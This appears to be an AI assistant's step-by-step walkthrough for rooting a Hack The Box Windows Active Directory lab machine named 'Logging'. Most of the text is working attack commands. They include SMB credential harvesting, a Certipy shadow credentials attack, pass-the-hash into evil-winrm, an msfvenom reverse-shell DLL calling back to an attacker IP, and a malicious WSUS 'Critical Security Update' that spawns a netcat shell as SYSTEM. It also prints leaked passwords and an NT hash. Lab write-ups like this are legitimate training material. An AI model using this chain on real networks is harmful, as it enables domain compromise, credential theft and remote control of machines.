# Logging

Let's get this box rooted. Since you are actively executing a transition from defensive SOC operations into Red Teaming, this machine is a perfect practical exercise—it heavily leverages the kind of Windows Internals and Active Directory configurations you've been studying, just from an offensive perspective. 

Here is the exact, step-by-step execution path tailored with your attacker IP (`10.10.16.26`) and the target IP (`10.129.171.22`).

### **Phase 1: Initial Access & Log Enumeration**
1. **Map the Target in your `hosts` file:**
   Add the target to your `/etc/hosts` file to ensure DNS resolution works properly for AD tools.
   ```bash
   echo "10.129.171.22 logging.htb" | sudo tee -a /etc/hosts
   ```
2. **Enumerate SMB Shares:**
   Using the provided starting credentials, connect to the SMB shares to pull the logs.
   ```bash
   smbclient -U 'wallace.everette%Welcome2026@' //10.129.171.22/Logs
   ```
3. **Extract the Service Credentials:**
   Download and parse the `.log` files. You will find the cleartext connection string:
   * **User:** `LOGGING\svc_recovery`
   * **Password:** `Em3rg3ncyPa$$2025`



### **Phase 2: Shadow Credentials Attack**
BloodHound would show that `svc_recovery` has `GenericWrite` over `msa_health$`, but direct login is restricted. You need to perform a Shadow Credentials attack to forge a certificate and extract the NTLM hash.

1. **Exploit `GenericWrite` with Certipy:**
   Use Certipy to add a Key Credential (the "fakemachine" mentioned in the chat) and retrieve the NT hash for the `msa_health$` account.
   ```bash
   certipy shadow auto -u 'svc_recovery@logging.htb' -p 'Em3rg3ncyPa$$2025' -account 'msa_health$' -dc-ip 10.129.171.22
   ```
   *This should output the NT hash for `msa_health$`: `603fc24ee01a9409f83c9d1d701485c5`.*

2. **Pass-the-Hash for Initial Shell:**
   Log in using Evil-WinRM.
   ```bash
   evil-winrm -i 10.129.171.22 -u 'msa_health$' -H 603fc24ee01a9409f83c9d1d701485c5
   ```



### **Phase 3: Privilege Escalation to User (`jaylee.clifton`)**
You are now on the box as `msa_health$`. The escalation relies on a vulnerable custom service (`UpdateMonitor`) that runs as `jaylee.clifton` and loads a DLL.

1. **Generate the Malicious x86 DLL:**
   On your local machine, generate a **32-bit (x86)** reverse shell DLL. (The chat confirmed 64-bit DLLs throw an error).
   ```bash
   msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.26 LPORT=4444 -f dll -o settings_update.dll
   ```
2. **Package the Payload:**
   The service expects the DLL to be inside a specific zip archive.
   ```bash
   zip Settings_Update.zip settings_update.dll
   ```
3. **Start Your Listener:**
   Open a new terminal tab and start catching.
   ```bash
   rlwrap nc -lnvp 4444
   ```
4. **Deploy the Payload via Evil-WinRM:**
   Upload the zip file to the specific directory the scheduled task monitors.
   ```powershell
   cd C:\ProgramData\UpdateMonitor\
   upload Settings_Update.zip
   ```
5. **Wait for Execution:**
   The `UpdateChecker Agent` runs every few minutes. Wait about 3-5 minutes, and you should catch a shell as `jaylee.clifton`. You can now read `C:\Users\jaylee.clifton\Desktop\user.txt`.



### **Phase 4: Privilege Escalation to SYSTEM**
Now that you have a shell as an administrative user (`jaylee.clifton`), you can abuse the local WSUS (Windows Server Update Services) instance running on ports 8530/8531.

1. **Set Up Local Port Forwarding (Optional but recommended):**
   If you need to interact with WSUS from your Kali box, you might want to use Chisel to forward port 8530. Alternatively, you can drop the exploit binary directly onto the Windows machine.
2. **Abuse WSUS:**
   You need to use a tool like **SharpWSUS** (compiled on your end) or **pywsus** to create a malicious update approval.
   If using SharpWSUS on the target:
   ```powershell
   # Upload your favorite post-exploitation binary (like a fresh reverse shell or netcat)
   upload nc.exe C:\Temp\nc.exe
   upload SharpWSUS.exe C:\Temp\SharpWSUS.exe
   
   # Use SharpWSUS to create and approve an update that executes your payload as SYSTEM
   C:\Temp\SharpWSUS.exe create /payload:"C:\Temp\nc.exe" /args:"10.10.16.26 5555 -e cmd.exe" /title:"Critical Security Update"
   C:\Temp\SharpWSUS.exe approve /updateid:<ID_FROM_PREVIOUS_COMMAND> /computername:LOGGING.HTB /groupname:"Test Group"
   ```
3. **Catch the Root Shell:**
   Set up a second listener on your machine (`nc -lnvp 5555`). Once the WSUS client checks in and applies the "update," it will execute your payload as `NT AUTHORITY\SYSTEM`. Grab `root.txt`.